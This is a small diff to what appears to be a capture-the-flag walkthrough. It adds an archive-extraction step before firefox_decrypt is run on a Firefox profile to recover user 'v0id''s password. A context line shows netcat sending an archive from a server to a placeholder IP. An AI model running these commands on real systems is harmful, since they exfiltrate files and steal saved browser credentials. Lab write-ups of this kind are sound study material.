@@ -121,6 +121,8 @@ And on the server: `nc -w 3 <IP> 1234 < ./archive.tar`.
 
 18) Then with `firefox_decrypt` we decrypt the password to the user `v0id`:
 
+```tar -xvf archive.tar```
+
 ```./firefox_decrypt.py ./( PATH TO DIRECTORY) b5w4643p.default-release```
 
 
